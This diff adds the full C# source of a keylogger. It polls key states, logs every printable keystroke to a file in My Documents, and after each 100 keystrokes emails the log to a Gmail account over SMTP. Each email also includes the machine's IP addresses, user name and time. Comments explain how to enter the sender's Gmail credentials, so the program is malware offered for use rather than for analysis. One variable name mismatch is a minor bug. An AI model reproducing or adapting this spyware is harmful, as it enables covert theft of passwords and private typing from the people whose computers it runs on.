@@ -1,0 +1,114 @@
+//This program is written in c#
+
+using System;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace keylogger2
+{
+    class Program
+    {[DllImport("User32")]
+    public static extern int GetAsyncKeyState(Int32 i);
+    static long numberofKeystrokes = 0;
+    static void Main (string [] args){
+         /*1.capture keystrokes and display them to the console
+             2. store the strokes in a text file
+            3. periodically send the contents of the file to an external email address.
+             */
+             string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+             if(!Directory.Exists(filepath)){
+                 Directory.CreateDirectory(filepath); }
+    
+    string path =(filepath + @"\keystrokes.txt");
+
+    if(!File.Exists(path)){
+        using ( StreamWriter sw = File.CreateText(path)){
+
+        }
+    }
+    while (true){
+        Thread.Sleep(110);
+
+        for (int i = 32; i < 127; i++){
+            int KeyState = GetAsyncKeyState(i);
+            //printing to the console
+            if( KeyState !=0){
+        Console.Write((char)i + ",");
+
+        //storing in a text file
+
+        using (StreamWriter sw = File.AppendText(path))
+        {
+            sw.Write((char)i);
+
+        }
+        numberofKeystrokes++;
+
+        //send every 100 characters typed, you can edit this number or set it on a timer
+
+        if (numberofKeystrokes % 100 == 0 )
+        {
+        SendNewMessage();
+        }
+
+
+
+            }
+        }
+    }
+    //now we setup the function that sends the contents of the file to an email address.
+    }         
+    
+    
+
+static void SendNewMessage()
+{
+// send the contents of the txt file to an external email address 
+
+string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+string filepath = folderName + @"\keystrokes.txt";
+
+String logContents = File.ReadAllText(filePath);
+string emailBody="";
+
+//create email address
+
+DateTime now = DateTime.Now;
+
+string subject = "Message from Keylogger";
+
+var host = Dns.GetHostEntry(Dns.GetHostName());
+
+foreach (var address in host.AddressList)
+{
+emailBody += "Address: " + address;
+}// the email that you recieve from the keylogger will send you these details about the keylogged computer
+emailBody += "\n User : " + Environment.UserDomainName + "\\" + Environment.UserName;
+ emailBody += "\nhost" + host;
+  emailBody += "\ntime" + now.ToString();
+   emailBody += logContents;
+
+ SmtpClient client = new SmtpClient("smtp.gmail.com", 587);  // this is what will be sending the email 
+            MailMessage mailMessage = new MailMessage();
+
+mailMessage.From = new MailAddress("yourgmail@gmail.com");
+            mailMessage.To.Add("yourgmail@gmail.com");
+
+            mailMessage.Subject = subject;
+
+            client.UseDefaultCredentials = false;
+            client.EnableSsl = true;
+            client.Credentials = new System.Net.NetworkCredential("yourgmail@gmail.com", "yourgmailsecurityKey");
+            /*NOTE for this to work you will have to setup your yourgmail to have a security key and then enter this security key 
+           in the place of "yourgmailsecuritykey" in order for the email to be able to send. */
+            mailMessage.Body = emailBody;
+            client.Send(mailMessage);
+}
+
+
+}
+
+}
